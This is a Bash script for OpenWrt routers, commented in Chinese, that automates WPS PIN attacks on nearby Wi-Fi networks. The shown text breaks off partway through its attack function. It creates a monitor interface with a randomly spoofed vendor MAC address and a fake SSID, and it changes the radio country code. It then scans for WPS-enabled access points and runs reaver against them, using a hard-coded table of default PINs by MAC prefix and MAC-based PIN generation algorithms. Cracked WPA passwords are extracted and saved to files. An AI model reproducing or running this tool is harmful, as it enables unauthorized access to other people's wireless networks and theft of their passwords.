#!/bin/bash
# 定义颜色
red='\e[91m' green='\e[92m' yellow='\e[1;33m' magenta='\e[95m' cyan='\e[96m' none='\e[0m'
sys_release=$(awk -F. '/DISTRIB_RELEASE/{print $1}' /etc/openwrt_release | cut -d "'" -f 2)    #获取openwrt系统版本
RE_ID= #存放执行程序的pid
#定义停留警告界面
Error() { read -sp "$(echo -e "\n${red}$*${none}\n")"; }

#定义停留通知界面
Notifi() { read -sp "$(echo -e "\n${green}$*${none}\n")"; }

#输出执行成功信息
PrintTrueInfo() { echo -e "\n${yellow}$*${none}\n"; }

#输出执行错误信息
PrintFalseInfo() { echo -e "\n${red}$*${none}\n"; }

#生成MAC地址文本的函数
MacAddress() {
	[ ! -e /etc/config/scp ] && mkdir -p /etc/config/scp
	cat > /etc/config/scp/ap_mac.txt <<-"EOF"
	TP-LINK^BC:46:99
	CMCC^18:69:DA
	CMCC^50:5D:AC
	CMCC^98:00:6A
	CMCC^D0:59:95
	CMCC^9C:FE:A1
	TP-LINK^B8:F8:83
	TP-LINK^BC:46:99
	CMCC^88:D2:74
	CMCC^0C:6A:BC
	CMCC^8C:60:AD
	HONOR^34:71:46
	HUAWEI^14:77:40
	MERCURY^BC:54:FC
	TP-LINK^48:0E:EC
	TP-LINK^78:44:FD
	TP-LINK^80:EA:07
	TP-LINK^80:8F:1D
	MERCURY^C0:A5:DD
	Xiaomi^28:D1:27
	CMCC^24:CA:CB
	HUAWEI^10:E9:53
	TP-LINK^24:69:68
	TP-LINK^64:6E:97
	TP-LINK^50:BD:5F
	TP-LINK^60:3A:7C
	TP-LINK^F8:8C:21
	Tenda^C8:3A:35
	TP-LINK^BE:A6:15
	Xiaomi^28:6C:07
	TP-LINK^54:75:95
	TP-LINK^DC:FE:18
	MERCURY^1C:60:DE
	Xiaomi^9C:9D:7E
	HUAWEI^54:F2:94
	TP-LINK^B8:F8:83
	MERCURY^50:3A:A0
	Tenda^C8:3A:35
	TP-LINK^74:05:A5
	MERCURY^C0:61:18
	EOF
}

#获取mac地址和名称
GetMacName() { 																																																														  
	[ ! -e /etc/config/scp/ap_mac.txt ] && PrintFalseInfo "没有找到存放ap mac地址的文档，请重新设置安全设置脚本!" && exit #没有找到存放ap的mac地址的文档提示并退出
	get_mac_num=$(cat /etc/config/scp/ap_mac.txt | wc -l)	#获取mac地址的总数量
	num=0	#计数
	while :;do
		[ "${num}" == "100" ] && exit	#有一百次的机会，到了一百次就退出脚本。
		let num=num+1	#计数器
		get_name_mac="$(sed -n "$(awk -v lineNum="$get_mac_num" 'BEGIN{srand();print int(rand() * 1000000 % lineNum +1)}')p" /etc/config/scp/ap_mac.txt)"
		[ -z "${get_name_mac}" ] && continue
		host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
		if [ "${host_name}" == "CMCC" ];then
			while :;do
				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
				host_name="${host_name}-${get_last_name}"				#汇总名字
				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
			done
		elif [ "${host_name}" == "@PHICOMM" ];then
			while :;do
				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
				host_name="${host_name}_${get_last_name}"				#汇总名字
				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
			done
		else
			while :;do
				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
				host_name="${host_name}_${get_last_name}"				#汇总名字
				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
			done			   
		fi																																																	
		wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
		[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
	done
}

#获取无线网络配置规则的排序最后的数值。
Get_Wifi_Info_Iface_Num() {
	count=0
	while :;do
		if [ "${count}" != "30" ];then  #判断循环是否到30次，到30次就退出循环，这个是做了循环次数限制
			[ -z "$(uci show | grep "wifinet${count}")" ] && Get_Wifi_Info_iface="${count}";break || let count+=1	
		else
			break
		fi
	done
}

#添加监听热点
AddMonitor() {
	#删除系统默认生成的wifi热点，先检测默认热点是否存在，存在则开始删除热点。
	if [ "$(uci show | grep "wireless.default_radio*")" != "" ];then
		num=0	   #定义一个默认的数值0
		while [ ${num} -lt ${wireless_num} ];do
			uci del wireless.default_radio${num}; let num+=1 #删除默认热点
		done
		uci commit wireless #应用无线配置文件
		[ ! -z "$(uci show | grep "wireless.default_radio*")" ] && PrintFalseInfo "没有成功删除系统默认生成的wifi热点"|| PrintTrueInfo "成功删除系统默认生成的wifi热点"
	fi
	select_wireless="$1"; [ -z ${select_wireless} ] && return 1	#接收创建热点的频段数，并检测接收的热点数为空则退出函数，并返回1值
	if [ "${select_wireless}" == "2" ];then #2为2.4G频段，获取2.4G频段无线名称
		test_driver=$(uci show | egrep "\'11g\'|\'2g\'" | cut -d '.' -f 2)  #获取2.4G频段无线名称，如radio0
	elif [ "${select_wireless}" == "5" ];then   #5为5G频段，获取5G频段无线名称
		test_driver=$(uci show | egrep "\'11a\'|\'5g\'" | cut -d '.' -f 2 | sed -n "1p")	#获取5G频段无线名称，如radio0
	elif [ "${select_wireless}" == "6" ];then   #6为第三个频段，默认是5G频段，获取5G频段无线名称
		test_driver=$(uci show | egrep "\'11a\'|\'5g\'" | cut -d '.' -f 2 | sed -n "2p")
	elif [ "${select_wireless}" == "4" ];then   #4为默认单频设备，所以直接复制无线名称就行。
		driver="radio0"
	fi
	if [ ! -z ${test_driver} ];then #判断测试的获取的测试驱动名称，检测是无线驱动是否存在，存在则把无线驱动复制给driver变量中，不存在提示报错信息
		[ ! -z "$(echo ${test_driver} | grep 'radio')" ] && driver=${test_driver} || { PrintFalseInfo "没有找到无线设备 !" ; exit; }
	fi
	[  -z "$(uci show | grep  "wireless.${driver}.country=\'TW\'")" ] && uci set wireless.${driver}.country='TW'  #国家代码不是台湾的，修改为台湾
	GetMacName  #获取伪装mac地址和伪装名称
	if [ "${sys_release}" == "18" ];then	#系统版本为18，直接获取无线网络设置配置
		class_name="$(uci add wireless wifi-iface)" #获取无线网络设置配置
	else
		Get_Wifi_Info_Iface_Num; class_name="wifinet${Get_Wifi_Info_iface}"   #先执行获取无线网络配置数值，然后赋值给变量
	fi
	#创建监听热点================================================>
	uci set wireless.${class_name}=wifi-iface
	uci set wireless.${class_name}.device="${driver}"
	uci set wireless.${class_name}.mode='monitor'
	uci set wireless.${class_name}.ssid="${host_name}${test_name}"
	uci set wireless.${class_name}.network='lan'
	# uci set wireless.${class_name}.disable='1'
	uci set wireless.${class_name}.macaddr="${wlan_mac}"
	uci commit wireless
	# uci delete wireless.${class_name}.disable='1'
	# uci commit wireless
	#<==========================================================
	wifi reload > /dev/null	 #重新加载无线配置
	if [[ ! -z "$(uci show | grep "${host_name}")" && ! -z "$(uci show | grep "${wlan_mac}")" ]];then	#判断监听热点是否创建成功																																													   
		echo -e "\n${yellow}监听热点创建完成 :${none}"
		echo -e "${yellow}监听热点名称: ${host_name}${none}"
		echo -e "${yellow}监听热点MAC: ${wlan_mac}${none}\n"
		uci set wireless.${driver}.disabled='0'; uci commit wireless; wifi reload > /dev/null
	else
		PrintFalseInfo "监听热点没有创建成功"; exit
	fi
}

#默认pin码
[ ! -f /tmp/pins.txt ] && cat > /tmp/pins.txt << "EOF"
00:01:38-35606543
00:05:CA-73851738
00:05:CA-76916144
00:0B:85-70066647
00:0C:F1-30447028
00:14:D1-26848185
00:18:02-16546615
00:18:E7-15537782
00:19:15-12345670
00:1A:2B-15624697
00:1A:2B-16495265
00:1A:2B-88478760
00:1D:19-66026402
00:1D:73-88420707
00:1D:7E-66026402
00:1D:CE-85560130
00:1F:A4-12345670
00:21:29-22310298
00:21:29-64637129
00:22:3F-48247818
00:24:01-97744757
00:24:17-31011193
00:25:9C-19805672
00:26:24-95374611
00:26:44-78202962
00:26:5A-76971464
00:26:5B-15488107
00:26:5B-36277216
00:26:5B-91514257
00:38:72-18836486
00:48:7A-15471628
00:4F:62-21207136
08:10:74-20956455
1A:0B:40-17068161
1C:7E:E5-22609298
1C:7E:E5-60418579
20:4E:7F-45197079
30:39:F2-16538061
30:39:F2-16702738
30:39:F2-18355604
30:39:F2-43297917
30:39:F2-73767053
30:39:F2-88202907
30:46:9A-19482417
30:46:9A-30592407
30:46:9A-95221021
34:08:04-36022656
34:08:04-93395274
38:72:C0-18836486
40:4A:03-11866428
50:67:F0-20064525
58:6D:8F-47158382
58:6D:8F-69382161
58:98:35-53890894
5C:33:8E-00764025
5C:33:8E-03015162
5C:33:8E-04581277
5C:33:8E-11765592
5C:33:8E-15986511
5C:33:8E-30414129
5C:33:8E-30999022
5C:33:8E-33685984
5C:33:8E-39657053
5C:33:8E-53842763
5C:33:8E-60387400
5C:33:8E-73968597
5C:33:8E-78614062
5C:33:8E-78963641
5C:33:8E-82848439
5C:33:8E-85776104
5C:33:8E-91345080
5C:35:3B-64874487
68:B6:FC-82380243
68:C0:6F-41719565
6A-C0-6F-41873281
72:23:3D-36228645
74:44:01-00446747
74:44:01-10052648
74:44:01-27615126
74:88:8B-16538061
74:88:8B-16702738
74:88:8B-18355604
74:88:8B-43297917
74:88:8B-73767053
74:88:8B-88202907
7C:4F:B5-72688656
7C:4F:B5-75332662
94:44:52-26023809
94:44:52-93645348
A0:21:87-92442559
A4:52:6F-16538061
A4:52:6F-16702738
A4:52:6F-18355604
A4:52:6F-43297917
A4:52:6F-73767053
A4:52:6F-88202907
C0:C1:C0-78985933
CO:3F:0E-25032918
D0:AE:EC-06235307
D0:AE:EC-12263813
D0:AE:EC-36831678
D0:AE:EC-43419012
D0:AE:EC-46275288
D0:AE:EC-49570724
D0:AE:EC-58441640
D0:AE:EC-67791088
D0:AE:EC-76871559
DC:0B:1A-16538061
DC:0B:1A-16702738
DC:0B:1A-18355604
DC:0B:1A-19756967
DC:0B:1A-43297917
DC:0B:1A-73767053
DC:0B:1A-88202907
E0:8F:EC-00235211
E0:CB:4E-62987523
F4:3E:61-12345670
F4:3E:61-47158382
F4:3E:61-69382161
F4:EC:38-03419724
F4:EC:38-04898702
F4:EC:38-05884889
F4:EC:38-09165847
F4:EC:38-11288879
F4:EC:38-18674095
F4:EC:38-19634173
F4:EC:38-23380622
F4:EC:38-26599625
F4:EC:38-42768777
F4:EC:38-44947477
F4:EC:38-51660567
F4:EC:38-52594809
F4:EC:38-67971862
F4:EC:38-72344071
F4:EC:38-91726681
F4:EC:38-95048147
EOF

# DÍGITO DE CONTROL QUE SE CALCULA A PARTIR DE LOS OTROS 7
CalcularCheckSum() {
    ACCUM=0
    ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
    ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
    DIGIT=`expr $ACCUM '%' 10`
    CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`
    PIN=`expr $PIN '+' $CHECKSUM`	
    PIN=`printf '%08d' $PIN`	
}

#根据WiFi的mac计算出来PIN码
CalcularPin() {
    BSSID_INICIO=$(echo $BSSID | cut -d ":" -f1,2,3)    #提取wifi的mac地址前三段，代表品牌厂商的
    BSSID_FINAL=$(echo $BSSID | cut -d ':' -f4-)        #提取wifi的mac地址后三段
    MAC=$(echo $BSSID_FINAL | tr -d ':')                #去掉mac地址中的:符号
    MAC_DECIMAL=$(printf '%d' 0x$MAC)                   #把mac地址转换为10进制
    STRING=`expr '(' $MAC_DECIMAL '%' 10000000 ')'`	    #获取7位数值
    PIN=`expr 10 '*' $STRING`		                    #获取8位数值，组成pin码	
    CalcularCheckSum; PINWPS1=$PIN		#计算pin码		
    STRING2=`expr $STRING '+' 8`; PIN=`expr 10 '*' $STRING2`; CalcularCheckSum    #计算pin码
    PINWPS2=$PIN; STRING3=`expr $STRING '+' 14`; PIN=`expr 10 '*' $STRING3`			
    CalcularCheckSum; PINWPS3=$PIN	                        #计算pin码				
    if [[ ! -z "$(echo $ESSID | egrep '^FTE-[[:xdigit:]]{4}[[:blank:]]*$')" ]];then
        FINESSID=$(echo $ESSID | cut -d '-' -f2)			
        CUARTO_PAR=$(echo $BSSID_FINAL | cut -d ':' -f1 | tr -d ':')	
        MACESSID=$(echo $CUARTO_PAR$FINESSID)			
        CONVERTEDMACESSID=$(printf '%d' 0x$MACESSID)		
        RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`	
        STRING4=`expr $RAIZ '+' 7`; PIN=`expr 10 '*' $STRING4`; CalcularCheckSum    #计算pin码
    else
        case $BSSID_INICIO in
        04:C0:6F | 20:2B:C1 | 28:5F:DB | 80:B6:86 | 84:A8:E4 | B4:74:9F | BC:76:70 | CC:96:A0 | F8:3D:FF) # FTE-???? CON EL ESSID CAMBIADO (3 PINs POSIBLES)
            echo $PINWPS1; echo $PINWPS2; PIN=$PINWPS3 ;; 
        *)
            PIN=$PINWPS1;;
        esac
    fi
    PrintTrueInfo "尝试pin值：$PIN"
}

#停止扫描网络
Stop_Scan_Wifi() {
    { sleep 20 && killall -2 airodump-ng; } &
}

#获取wifi相关的信息
Get_Wifi_Info() {
	printf '\033[8;32;122t'	#控制窗口大小
    PrintTrueInfo "正在扫描wps的WiFi，请等待20秒......"
    #删除存放信息的文档===============================>
    [ -f /tmp/wps.txt ] && rm /tmp/wps.txt
    [ -f /tmp/WPS_WS.txt ] && rm /tmp/WPS_WS.txt
    [ -f /tmp/test_wps.csv ] && rm /tmp/test_wps.csv
    [ -f /tmp/output*.csv ] && rm /tmp/output*.csv
	[ -f /tmp/_WPS_WS.txt ] && rm /tmp/_WPS_WS.txt
    #<==============================================
    Stop_Scan_Wifi& #停止扫描网络
    if [ "${sys_release}" == "21" ];then     #判断系统是否是21版本
        test_bga_nac=$(uci show | grep "${driver}.band=" | cut -d "'" -f 2) #系统是21版本的提取频段的规则
    else
        test_bga_nac=$(uci show | grep "${driver}.hwmode=" | cut -d "'" -f 2)   #系统不是21版本的提取频段的规则
    fi
    if [ ! -z "$(iwinfo radio0 info | egrep "bgnac|nac")" ];then    #判断当前频段是否为2.4G和5G在同一个频段上的，如k2p，这样就需要给上全部信道，1-165
        airodump-ng --wps -c 1-165 ${monitor_driver} | tee /tmp/test_wps.csv    #开始扫描周围的WiFi信息，新看一个sh，将WiFi信息放到指定文档中
    elif [ "$(echo ${test_bga_nac} | egrep '11a|5g')" != "" ];then
        airodump-ng --wps -c 36-165 ${monitor_driver} | tee /tmp/test_wps.csv   #开始扫描周围的WiFi信息，新看一个sh，将WiFi信息放到指定文档中
    else                                                                    #判断是2G的频段，就不用指定信道了，默认就是扫描2G信号的信道，1-13
        airodump-ng --wps ${monitor_driver}  | tee /tmp/test_wps.csv       #开始扫描周围的WiFi信息，新看一个sh，将WiFi信息放到指定文档中
    fi
    egrep '2\.0|1\.0' /tmp/test_wps.csv | sort -u | sed '/length/d;/^$/d' > /tmp/tmp_wps.txt    #wps2.0和1.0的WiFi提取出来，并处理不需要显示的WiFi，放到指定的文档中
    [ -z "$(cat /tmp/tmp_wps.txt)" ] && PrintFalseInfo "没有找到带有wps的WiFi" && return 1  #提取出来的文档是空的，提示错误并退出函数
    [ -f /tmp/wps.txt ] && rm /tmp/wps.txt  #删除存在存有带wps的wifi信息文档。
    count=1 #计数
    while :;do
        line_sata=$(sed -n "${num}p" /tmp/tmp_wps.txt)  #逐行获取带有wps的WiFi信息
        [ -z "${line_sata}" ] && break  #提取出来的信息是空的，退出循环
        get_mac_addr="$(echo "${line_sata}" | cut -d ' ' -f 2)" #获取WiFi的mac地址
        let num+=1  #计数
        if [ "$(echo "${get_mac_addr}" | wc -L)" == "17" ];then #判断wifimac地址是否是完整的
            if [ -f /tmp/wps.txt ];then #存放wifi信息的文档存在，就将获取到的wifi信息放到文档中，这块主要是解决追加重复的wifi
                [ -z "$(cat /tmp/wps.txt | grep "${get_mac_addr}")" ] && echo "${line_sata}" >> /tmp/wps.txt    #检测重复的wifi，没有则追加
            else
                echo "${line_sata}" >> /tmp/wps.txt #追加wifi信息
            fi
        fi
    done
    sed -i '/^$/d' /tmp/wps.txt; sleep 2    #处理空白行
	cat /tmp/wps.txt | cut -d " " -f 2 > /tmp/WS_BSSID.txt   #获取wifi的mac地址
    if [ "${test_bga_nac}" == "11a" ];then  #提取wifi的信道
        cat /tmp/wps.txt | cut -d " " -f 25,26 > /tmp/WS_Channel.txt    #获取5G信道
    else
	    cat /tmp/wps.txt | cut -d " " -f 25,26,27|sed "s/^ //;s/^ //" | awk '{print $1}' > /tmp/WS_Channel.txt    #获取2.4G信道
    fi
	cat /tmp/wps.txt | cut -d " " -f 4 > /tmp/WS_Power.txt              #获取WiFi的信号
    [ -f /tmp/WS_ESSID.txt ] && rm /tmp/WS_ESSID.txt                    #删除存在存放wifi名称的文档
    test -f /tmp/_WS_ESSID.txt && rm /tmp/_WS_ESSID.txt                 #删除存放临时存放wifi名称的文档
    awk '{print $12 $13 $14}' /tmp/wps.txt | sed "s/^\ //g;s/ /\^\&/g" > /tmp/WS_ESSID.txt  #获取wifi名称,并把空格替换为^&追加到指定文档中
	sed -i "s/DISP//g;s/\,//g;s/PBC//g;s/KPAD//g;s/^\ //g;s/2\.0//g;s/1\.0//g;s/^LAB//g;s/ETHERLAB//g" /tmp/WS_ESSID.txt   #把存放wifi名称的文档开头除了wifi名称外的都去掉
    sed -i "s/ //g" /tmp/WS_Channel.txt /tmp/WS_Power.txt               #把存放wifi信号和信道文档中的空格去掉
	num=1
	while :;do
		BSSID="$(cat /tmp/WS_BSSID.txt | sed -n "${num}p")"     #逐行获取wifi的mac地址
		Channel="$(cat /tmp/WS_Channel.txt | sed -n "${num}p"| awk '{print $1}')" #逐行获取wifi的信道
		Power="$(cat /tmp/WS_Power.txt | sed -n ${num}p)"       #逐行获取wifi的信号   
		ESSID="$(cat /tmp/WS_ESSID.txt | sed -n ${num}p)"       #逐行获取wifi的名称
        let num=num+1	#计数
		[ -z ${BSSID} ] && break                                #wifi的mac地址为空，退出循环
		[ -z "${ESSID}" ] && continue							#wifi的名称为空终止此次循环
        [ -z ${Channel} ] && continue                           #信道为空终止此次循环
        [ -z "${Power}" ] && continue                           #信号为空终止此次循环
        [ -f /tmp/_WPS_WS.txt ] && [ ! -z "$(grep ${BSSID} /tmp/_WPS_WS.txt)" ] && continue #检查临时存放wifi信息的文档中已经存放了的wifi就终止此次循环
        echo -e "\t${Power}\t${BSSID}  ${Channel}\t${ESSID}" >> /tmp/_WPS_WS.txt    #将WiFi信息存放到临时文档中。
	done
    sort -n -k 2 -t - /tmp/_WPS_WS.txt |awk '{print NR "" $0}' >/tmp/WPS_WS.txt #排序 wifi
	wifi_num=$(cat /tmp/WPS_WS.txt | wc -l)	    #获取wifi总数量
}

#删除监听热点
DeleteMonitor() {
    del_ap=$(uci show | awk -F. '/'${wlan_mac}'/{print $1"."$2}')   #获取监听热点的配置规则
	[ -z ${del_ap} ] && PrintFalseInfo "没有检测到监听热点" && return 1 #判断没有监听热点退出函数
	uci delete ${del_ap}    #删除监听热点
    #判断监听热点是否删除成功
	[ -z "$(uci show | grep "${wlan_mac}")" ] && PrintTrueInfo "监听热点${host_name}删除完成" || PrintFalseInfo "监听热点${host_name}没有删除完成，可手动删除监听热点"
	uci commit wireless; wifi reload > /dev/null    #应用无线配置文件和重新加载无线
}

#关闭网卡无线功能
DisabledWifi() {
    wireless_num=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)    #获取频段数量
    count=0 num=1 #定义一个频段数的变量和计数变量
    while [ ${count} -lt ${wireless_num} ];do   #根据频段数进行循环，当大于频段数退出循环
        uci set wireless.radio${count}.disabled='1' #设置禁用网卡无线功能
        uci commit wireless; wifi reload > /dev/null    #应用无线和重新加载无线配置
        if [ "$(uci get wireless.radio${count}.disabled)" != "1" ];then #判断无线供能是否禁用成功，只有5次机会，到了5次就不禁用了。
            let num+=1; [ "${num}" != "5" ] && continue
        fi
        let count+=1;num=1
    done
}

#启用网卡无线功能
EnabledWifi() {
    wireless_num=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)    #获取频段数量
    count=0 num=1 #定义一个频段数的变量和计数变量
    while [ ${count} -lt ${wireless_num} ];do   #根据频段数进行循环，当大于频段数退出循环
        uci set wireless.radio${count}.disabled='0' #设置启用网卡无线功能
        uci commit wireless; wifi reload > /dev/null    #应用无线和重新加载无线配置
        if [ "$(uci get wireless.radio${count}.disabled)" != "0" ];then #判断无线供能是否启用成功，只有5次机会，到了5次就不启用了。
            let num+=1
            [ "${num}" != "5" ] && continue
        fi
        let count+=1;num=1
    done
}

#清理内存
CleanMem() {
	echo 1 > /proc/sys/vm/drop_caches; echo 2 > /proc/sys/vm/drop_caches; echo 3 > /proc/sys/vm/drop_caches
}

#检测是否再次pin
TestAgenPin() {
    [ "${PIN}" != "12345670" ] && { AgenPin=1;PIN=12345670;return 0; } || { AgenPin=;PIN=;return 1; }
}

#检测pin网络的情况
CheckPinInfo() {
    ret_str=    #定义一个返回值变量
    [ -f /tmp/${Bsid}.wps ] && rm  /tmp/${Bsid}.wps
    KillSofteware; TestAgenPin; [[ $? == 0 ]] && { ret_str=2;return; }
    clear; { [ "${count_num}" == "${circulate_num}" ] && echo -e "\n\n${yellow}* * * ${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"; }
    [ "${select_num}" != "a" ] && { [ "${count_num}" == "${circulate_num}" ] && { Notifi "回车后继续pin"; ret_str=1; }; } || return 0 #不是选择pin所有的WiFi，提示用户，并返回
}

#删除临时文件
Delete_WPC() { rm -f ./*.wpc &>/dev/null; }

#秒pin WiFi
Attack_Wifi() {
	BSSID=${Bsid}; ESSID=${Esid}    #转换变量名称
	head_BSSID=$(echo ${BSSID} | cut -d : -f 1-3)   #获取mac地址的头三段
	if [ -z "${PIN}" ];then
		if [ -f /tmp/pins.txt ];then    #检查默认的pin码文档
			get_pin=$(cat /tmp/pins.txt | grep ${head_BSSID})   #在默认pin码文档中查找这个品牌的mac地址，
			if [ ! -z "${get_pin}" ];then   #存在的话就提取，就提取默认的pin码
				PIN=$(echo ${get_pin} | cut -d - -f 2)
				PrintTrueInfo "尝试pin值：$PIN"
			else    #没有找到默认的pin码，就根据mac地址计算出来pin码
				CalcularPin #根据WiFi的mac计算出来PIN码
			fi
		else    #没有找到默认pin码的文档就根据WiFi的mac计算出来PIN码
			CalcularPin #根据WiFi的mac计算出来PIN码
		fi 
	else
		PrintTrueInfo "尝试pin值：$PIN"
	fi
	{ reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
	RE_ID=$!    #获取执行id
	AgenPin=    #定义再次pin变量
	ret_str=    #定义一个返回值变量
	line_num=1
	while :;do
		if [ ! -z ${AgenPin} ];then #不为空则重新pin
			PrintTrueInfo "尝试pin值：$PIN"
			{ reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
			RE_ID=$!; AgenPin=  #获取执行id，给判断再次pin变量清空
		fi
		if [ -f /tmp/${Bsid}.wps ];then
			PINES=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | sort -u | wc -l` #检测尝试pin有多少行，去重复
			PINES_b=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | wc -l`         #检车尝试pin有多少行
			error_a=`cat /tmp/${Bsid}.wps | grep 'Failed to associaten' | wc -l`                    #检测失败的连线多少行
			wps_line_num=$(cat /tmp/${Bsid}.wps | wc -l)                                            #检测wps存储的信息多少行
			if [ ! -z "$(cat /tmp/${Bsid}.wps | grep 'WPA PSK')" ];then                             #检测pin出来密码
				passwd_str="$(cat /tmp/${Bsid}.wps | grep 'WPA PSK' | cut -d : -f 2 | sed "s/'//g" )"   #提取密码
				pin_str="$(cat /tmp/${Bsid}.wps | grep 'WPS PIN' | cut -d : -f 2 | sed "s/'//g" )"      #提取PIN码
				clear; echo -e "\n\n${yellow}* * * ${Esid} 成功ping出密码* * *${none}\n"
				echo -e "\n${yellow}pin值：${pin_str}${none}"; echo -e "\n${yellow}密码 ：${passwd_str}${none}"; echo -e "\n${yellow}MAC地址 ：${Bsid}${none}\n\n"
				[[ -f /tmp/all_passwd.txt && -n "$(grep "${Bsid}" /tmp/all_passwd.txt 2>/dev/null)" ]] && passwd_path="/tmp/pin_passwd.txt" || passwd_path="/tmp/pin_passwd.txt /tmp/all_passwd.txt"
				echo -e "\n\n* * * ${Esid} 成功ping出密码* * *\npin值：${pin_str}\n密码 ：${passwd_str}\nMAC地址：${Bsid}" | tee -a ${passwd_path} &>/dev/null
				if [ "${select_num}" != "a" ];then  #不是选择pin所有的WiFi，提示用户记录好密码
					Notifi "请记录好pin出来的密码，回车后继续pin"; [ -f  /tmp/${Bsid}.wps ] && rm  /tmp/${Bsid}.wps
				fi
				return 3
			elif [ ! -z "$(echo ${wps_line_num} | egrep '^[354]$')" ];then  #判断pin状态，总行数是3,5,4行的，证明是卡主了就直接终止pin就行
				[ "${line_num}" == "5" ] && { CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; };break; }     #给了5次机会
				let line_num+=1
			elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" -ge "150" ];then    #判断pin状态，总行数是大于等于150行的还没有pin出来，证明没有希望了，直接终止pin就行
				CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环.
			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Failed to recover WPA key' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
				CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
			elif [ "$(cat /tmp/${Bsid}.wps | grep 'WARNING: Detected' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
				CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending authentication request' | wc -l)" == "5" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
			elif [ "$(cat /tmp/${Bsid}.wps |  grep -e "0x02" -e "0x03" -e "0x04")" != "" ];then     #检查到这些进制的时候，没有希望pin下去了。
				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending EAPOL START request' | wc -l)" == "4" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
			elif [ "${PINES_b}" -ge "2" ] && [ "${PINES}" == "1" ];then #检测尝试pin出现多行，就没有希望pin下去了
				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
			fi
		fi
		read -t 1 -n 1 selct_q  #等待用户1秒钟，输入任意键终止pin码
		if [ "$?" == "0" ];then #检测输入任意键后，开始退出此次pin，不是退出脚本
			if [ "${select_num}" == "a" ];then  #检查用户输入的是pin全部wifi，就显示所有pin出来密码的网络。
				KillSofteware; clear
				[ -f /tmp/pin_passwd.txt ] && { PrintTrueInfo "pin出来的密码，请记录好："; cat /tmp/pin_passwd.txt; Notifi "回车后退出"; return 5; }
			else    #没有选择pin所有网络，直接退出
				PrintTrueInfo "正在退出. . ."; KillSofteware 
			fi
